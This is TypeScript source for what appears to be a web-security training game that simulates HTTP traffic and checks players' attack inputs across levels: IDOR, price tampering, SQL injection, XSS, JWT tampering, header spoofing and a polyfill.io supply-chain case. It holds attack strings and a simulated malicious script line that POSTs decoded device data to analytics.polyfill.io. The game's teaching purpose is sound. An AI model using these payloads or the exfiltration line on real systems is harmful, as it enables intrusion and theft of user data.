import { CASE_STUDIES } from '../constants';
import { NetworkRequest } from '../types';

export interface ActiveRulesState {
  rewrite: boolean;
  script: boolean;
  mapLocal: boolean;
}

export interface BackendResponseResult {
  response: NetworkRequest;
  shouldTriggerSuccess: boolean;
}

// 初始流量构造逻辑：根据关卡生成首批请求
export function buildInitialRequests(caseId: string): NetworkRequest[] {
  const now = Date.now();
  const activeCase =
    CASE_STUDIES.find(c => c.id === caseId) ?? CASE_STUDIES[0];

  const requests: NetworkRequest[] = [];

  // 文档加载请求
  const docReq: NetworkRequest = {
    id: `doc-${now}`,
    url: activeCase.initialUrl || 'https://demo.local',
    method: 'GET',
    status: 200,
    type: 'document',
    size: 1200,
    time: 80,
    timestamp: now,
    requestHeaders: {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en-US,en;q=0.9',
      'Cache-Control': 'max-age=0',
      'Connection': 'keep-alive',
      'Host': 'demo.local',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    },
    responseHeaders: { 'Content-Type': 'text/html' },
    responseBody: '<html>...</html>',
    protocol: 'HTTP/2.0',
    remoteAddress: '127.0.0.1:443',
    cookies: {}
  };
  requests.push(docReq);

  // 剧情 01：额外模拟一次老版本 JS 静态资源请求，方便在 Network/Reqable 中观察 CDN 缓存线索
  if (caseId === 'story_01_login_outage') {
    requests.push({
      id: `static-js-${now}`,
      url: 'https://static.cdn.corp/assets/app-legacy.js',
      method: 'GET',
      status: 200,
      type: 'script',
      size: 8600,
      time: 45,
      timestamp: now + 20,
      requestHeaders: {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://demo.local/',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
      },
      responseHeaders: {
        'Content-Type': 'application/javascript',
        'X-CDN-Cache': 'HIT',
        'X-Asset-Version': 'app-legacy-2024.03',
      },
      responseBody: '// legacy JS bundle (simulated)',
      protocol: 'h2',
      remoteAddress: '104.21.55.2:443',
      cookies: {}
    });
  }

  // Case-specific API traffic
  if (caseId === 'case_04' || caseId === 'story_04_idor') {
    const baseOrder =
      caseId === 'story_04_idor'
        ? {
          id: 1001,
          item: '年度会员',
          price: 299,
          user: '张三',
          address: '北京市朝阳区产业园 99 号',
          phone: '13800000000',
        }
        : {
          id: 1001,
          item: 'Mechanical Keyboard',
          price: 150,
          user: 'Guest User',
          address: '123 Main St',
        };
    requests.push({
      id: `api-${now}`,
      url: 'https://shop.demo/api/orders/1001',
      method: 'GET',
      status: 200,
      type: 'fetch',
      size: 450,
      time: 150,
      timestamp: now + 50,
      requestHeaders: {
        'Cookie': 'session=user_1001',
        'Accept': 'application/json',
        'User-Agent': 'Reqable/2.16.0'
      },
      responseHeaders: {},
      responseBody: JSON.stringify(baseOrder, null, 2),
      protocol: 'h2',
      remoteAddress: '192.168.1.10:443',
      cookies: { 'session': 'user_1001' }
    });
  } else if (caseId === 'case_16') {
    requests.push({
      id: `api-${now}`,
      url: 'https://admin-internal.corp/manage',
      method: 'GET',
      status: 403,
      type: 'fetch',
      size: 50,
      time: 40,
      timestamp: now + 50,
      requestHeaders: { 'User-Agent': 'Mozilla/5.0' },
      responseHeaders: {},
      responseBody: JSON.stringify(
        { error: 'Forbidden: External IP Denied' },
        null,
        2,
      ),
      protocol: 'HTTP/1.1',
      remoteAddress: '10.0.0.5:8080'
    });
  } else if (caseId === 'case_06') {
    requests.push({
      id: `api-${now}`,
      url: 'https://auth.provider/api/me',
      method: 'GET',
      status: 200,
      type: 'fetch',
      size: 200,
      time: 60,
      timestamp: now + 50,
      requestHeaders: {
        Authorization:
          'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QifQ.signature',
      },
      responseHeaders: {},
      responseBody: JSON.stringify({ user: 'guest', role: 'guest' }),
      protocol: 'h2',
      remoteAddress: '172.217.160.142:443'
    });
  }

  return requests;
}

// 后端模拟逻辑：根据请求和关卡返回响应，并决定是否触发通关
export function buildBackendResponse(
  activeCaseId: string,
  req: NetworkRequest,
  activeRules: ActiveRulesState,
): BackendResponseResult {
  const now = Date.now();

  let responseReq: NetworkRequest = {
    ...req,
    id: `${req.id}-res`,
    timestamp: now,
    status: 200,
    time: Math.floor(Math.random() * 100) + 30,
    protocol: req.protocol || 'h2',
    remoteAddress: req.remoteAddress || '127.0.0.1:443'
  };

  // Default Realistic Headers
  const bodyLength = responseReq.responseBody ? new TextEncoder().encode(responseReq.responseBody).length : 0;
  responseReq.responseHeaders = {
    'date': new Date().toUTCString(),
    'server': 'nginx/1.18.0 (Ubuntu)',
    'connection': 'keep-alive',
    'content-length': bodyLength.toString(),
    'x-request-id': `req_${Math.random().toString(36).substr(2, 9)}`,
    'content-type': 'application/json; charset=utf-8', // Default, overridden by specific logic
    ...responseReq.responseHeaders
  };

  let shouldTriggerSuccess = false;

  if (activeCaseId === 'case_01' || activeCaseId === 'story_01_login_outage') {
    if (req.url.includes('/api/v2/login') && req.method === 'POST') {
      responseReq.status = 200;
      responseReq.responseBody = JSON.stringify(
        {
          success: true,
          msg: 'Login v2 Successful',
          token: 'v2_access_granted',
        },
        null,
        2,
      );
      shouldTriggerSuccess = true;
    } else if (req.url.includes('legacy')) {
      responseReq.status = 500;
      responseReq.responseHeaders = {
        'X-Error-Info': btoa(
          'API Deprecated. Please use v2 endpoint: POST /api/v2/login',
        ),
      };
    }
  } else if ((activeCaseId === 'case_02' || activeCaseId === 'story_02_price_tampering') && req.url.includes('/checkout')) {
    try {
      const body = JSON.parse(req.requestBody || '{}');
      if (body.price > 0 && body.price < 1000) {
        responseReq.status = 200;
        responseReq.responseBody = JSON.stringify(
          activeCaseId === 'story_02_price_tampering'
            ? { success: true, msg: 'Premium Membership Activated', orderId: 9921 }
            : { success: true, msg: 'Order Confirmed', orderId: 9921 },
          null,
          2,
        );
        shouldTriggerSuccess = true;
      } else {
        responseReq.status = 403;
        responseReq.responseBody = JSON.stringify(
          activeCaseId === 'story_02_price_tampering'
            ? { error: 'Payment blocked: mismatched membership price, suspected parameter tampering.' }
            : { error: 'Insufficient Funds for this Item' },
          null,
          2,
        );
      }
    } catch (e) {
      responseReq.status = 400;
    }
  } else if (activeCaseId === 'story_05_metrics_misleading') {
    if (req.url.includes('/api/logs/orders')) {
      responseReq.status = 200;
      responseReq.responseBody = JSON.stringify(
        {
          window: '1h',
          total: 1000,
          success: 900,
          failure: 100,
          note: '真实失败率约 10%，并非图表显示的“几乎归零”。',
        },
        null,
        2,
      );
    } else if (req.url.includes('/metrics/raw')) {
      responseReq.status = 200;
      responseReq.responseBody = JSON.stringify(
        {
          metric: 'order_success_rate',
          window: '1h',
          events: {
            success: 900,
            retry_failures: 800,
            hard_failures: 100,
          },
          note: '埋点将重试也计为失败，导致监控面板成功率接近 0。',
        },
        null,
        2,
      );
      shouldTriggerSuccess = true;
    }
  } else if (activeCaseId === 'story_06_stacktrace_leak') {
    if (req.url.includes('/api/orders/error')) {
      responseReq.status = 200;
      responseReq.responseBody = JSON.stringify(
        {
          error: 'SQLException: relation "orders" does not exist',
          stacktrace: [
            'com.example.orders.OrderDAO.list(OrderDAO.java:58)',
            'com.example.orders.OrderController.handle(OrderController.java:34)',
            'org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014)',
          ],
          server: 'app-node-3',
          path: '/api/orders/error',
          leak: 'Stacktrace and internal class names exposed to end users.',
        },
        null,
        2,
      );
      shouldTriggerSuccess = true;
    }
  } else if (activeCaseId === 'story_07_waf_callback') {
    if (req.url.includes('/api/callback') && !req.requestHeaders['X-WAF-Allow']) {
      responseReq.status = 403;
      responseReq.responseBody = JSON.stringify(
        {
          error: 'WAF_BLOCKED',
          reason: 'Payload contains sensitive keywords (payment_token).',
        },
        null,
        2,
      );
    } else if (req.url.includes('/api/callback') && (req.requestHeaders['X-WAF-Allow'] || '').includes('callback')) {
      responseReq.status = 200;
      responseReq.responseBody = JSON.stringify(
        {
          success: true,
          message: 'Callback accepted (temporary allow header).',
        },
        null,
        2,
      );
      shouldTriggerSuccess = true;
    }
  } else if (activeCaseId === 'story_incident_gray_release') {
    if (req.url.includes('/api/gray-release/override') && req.method === 'POST') {
      const body = req.requestBody || '';
      if (body.includes('wechat-ab-992') && body.includes('"action"') && body.includes('disable')) {
        responseReq.status = 200;
        responseReq.responseBody = JSON.stringify(
          { status: 'ok', rollout: 'disabled', experimentId: 'wechat-ab-992' },
          null,
          2,
        );
        shouldTriggerSuccess = true;
      } else {
        responseReq.status = 400;
        responseReq.responseBody = JSON.stringify(
          { error: 'body_missing_fields', hint: '需要 experimentId/action=disable/reason/owner' },
          null,
          2,
        );
      }
    }
  } else if (activeCaseId === 'story_polyfill_ioc_capture') {
    if (req.url.includes('polyfill.io/v3/polyfill.min.js')) {
      responseReq.status = 200;
      responseReq.responseHeaders = {
        ...responseReq.responseHeaders,
        'content-type': 'application/javascript',
        'x-ioc-hint': 'analytics.polyfill.io',
      };
      responseReq.responseBody = `// polyfill payload (截断)\nconst payload = atob('ZGV2aWNldGVsZW1ldHMuLi4=');\nfetch('https://analytics.polyfill.io/v1/collect', { method: 'POST', body: payload });`;
      shouldTriggerSuccess = true;
    } else if (req.url.includes('analytics.polyfill.io')) {
      responseReq.status = 200;
      responseReq.responseBody = JSON.stringify(
        { status: 'beacon_captured', note: '恶意上报已被记录' },
        null,
        2,
      );
    }
  } else if (activeCaseId === 'story_polyfill_tls_fallback') {
    const tlsHeader =
      req.requestHeaders['X-Debug-Force-TLS'] ||
      req.requestHeaders['x-debug-force-tls'] ||
      '';
    if (tlsHeader.includes('h2')) {
      responseReq.status = 526;
      responseReq.responseBody = JSON.stringify(
        {
          error: 'TLS_HANDSHAKE_FAILURE',
          detail: 'ALPN negotiated h2, client cipher suite unsupported.',
        },
        null,
        2,
      );
    } else if (tlsHeader.includes('http1')) {
      responseReq.status = 200;
      responseReq.responseBody = JSON.stringify(
        {
          result: 'ok',
          protocol: 'http/1.1',
          hint: '回退策略生效，老客户端可用',
        },
        null,
        2,
      );
      shouldTriggerSuccess = true;
    }
  } else if (activeCaseId === 'story_polyfill_reqable_rule') {
    const body = req.requestBody || '';
    if (req.url.includes('/api/rules/apply')) {
      if (body.includes('analytics.polyfill.io') && body.includes('block')) {
        responseReq.status = 200;
        responseReq.responseBody = JSON.stringify(
          { rule_applied: true, message: '恶意域名已被临时阻断' },
          null,
          2,
        );
        shouldTriggerSuccess = true;
      } else {
        responseReq.status = 400;
        responseReq.responseBody = JSON.stringify(
          { error: 'rule_missing', hint: '脚本必须匹配 analytics.polyfill.io 并包含 block()' },
          null,
          2,
        );
      }
    }
  } else if (activeCaseId === 'story_polyfill_cdn_validation') {
    if (req.url.includes('self-cdn.corp')) {
      responseReq.status = 200;
      responseReq.responseHeaders = {
        ...responseReq.responseHeaders,
        'cache-control': 'public, max-age=60, must-revalidate',
        'x-cache-status': 'BYPASS',
        age: '0',
      };
      responseReq.responseBody = JSON.stringify(
        {
          file: 'polyfill.min.js',
          version: 'self-hosted-2024-07-01',
          purge: 'fresh',
        },
        null,
        2,
      );
      shouldTriggerSuccess = true;
    }
  }
  // 其余关卡逻辑保持原样，只将 triggerSuccess 替换为标记 shouldTriggerSuccess
  else if ((activeCaseId === 'case_04' || activeCaseId === 'story_04_idor') && req.url.includes('/orders/1002')) {
    responseReq.status = 200;
    responseReq.responseBody = JSON.stringify(
      activeCaseId === 'story_04_idor'
        ? {
          id: 1002,
          item: '年度会员',
          price: 299,
          user: '李四',
          address: '上海市浦东新区金融街 8 号',
          phone: '13900000000',
        }
        : {
          id: 1002,
          item: 'Mechanical Keyboard',
          price: 150,
          user: 'Other User',
          address: '456 Side St',
        },
      null,
      2,
    );
    shouldTriggerSuccess = true;
  } else if ((activeCaseId === 'case_03' || activeCaseId === 'story_03_sql_injection') && (req.url.includes("' OR") || req.url.includes("%27%20OR%20%271%27%3D%271%27"))) {
    responseReq.status = 200;
    responseReq.responseBody = JSON.stringify(
      activeCaseId === 'story_03_sql_injection'
        ? { mode: 'sql_injection', effect: 'full_table_scan', rows: 'ALL_EMPLOYEES' }
        : { mode: 'sql_injection', effect: 'full_table_scan' },
      null,
      2,
    );
    shouldTriggerSuccess = true;
  } else if (
    (activeCaseId === 'case_05' || activeCaseId === 'case_15') &&
    ((req.requestBody || '').includes('<script>') ||
      (req.requestBody || '').includes('onerror'))
  ) {
    shouldTriggerSuccess = true;
  } else if (
    activeCaseId === 'case_07' &&
    (req.requestBody || '').includes('100')
  ) {
    shouldTriggerSuccess = true;
  } else if (activeCaseId === 'case_08' && req.method === 'POST') {
    shouldTriggerSuccess = true;
  } else if (
    activeCaseId === 'case_16' &&
    (req.requestHeaders['x-forwarded-for'] || '').includes('127.0.0.1')
  ) {
    shouldTriggerSuccess = true;
  } else if (
    activeCaseId === 'case_18' &&
    (req.requestHeaders['user-agent'] || '').includes('Mobile')
  ) {
    shouldTriggerSuccess = true;
  } else if (
    activeCaseId === 'case_19' &&
    (req.requestHeaders['referer'] || '').includes('partner')
  ) {
    shouldTriggerSuccess = true;
  } else if (
    activeCaseId === 'case_20' &&
    !(req.requestHeaders['cookie'] || '').includes('voted=true')
  ) {
    shouldTriggerSuccess = true;
  } else if (activeCaseId === 'case_21' && req.method === 'DELETE') {
    shouldTriggerSuccess = true;
  } else if (
    activeCaseId === 'case_22' &&
    (req.requestBody || '').includes('__schema')
  ) {
    shouldTriggerSuccess = true;
  } else if (
    activeCaseId === 'case_23' &&
    req.url.includes('internal')
  ) {
    shouldTriggerSuccess = true;
  } else if (
    activeCaseId === 'case_24' &&
    (req.requestHeaders['content-type'] || '').includes('image') &&
    (req.requestBody || '').includes('php')
  ) {
    shouldTriggerSuccess = true;
  } else if (
    activeCaseId === 'case_06' &&
    (req.requestHeaders['authorization'] || '').includes('admin')
  ) {
    shouldTriggerSuccess = true;
  } else if (
    activeCaseId === 'case_13' &&
    (req.requestHeaders['authorization'] || '').includes('none')
  ) {
    shouldTriggerSuccess = true;
  } else if (activeCaseId === 'case_14') {
    try {
      const token = req.requestHeaders['authorization']?.split('.')[1];
      if (atob(token || '').includes('admin')) {
        shouldTriggerSuccess = true;
      }
    } catch (e) {
      // ignore decode errors
    }
  } else if (activeCaseId === 'case_32' && activeRules.rewrite) {
    shouldTriggerSuccess = true;
  } else if (activeCaseId === 'case_33' && activeRules.script) {
    shouldTriggerSuccess = true;
  } else if (activeCaseId === 'case_34' && activeRules.mapLocal) {
    shouldTriggerSuccess = true;
  }

  return { response: responseReq, shouldTriggerSuccess };
}
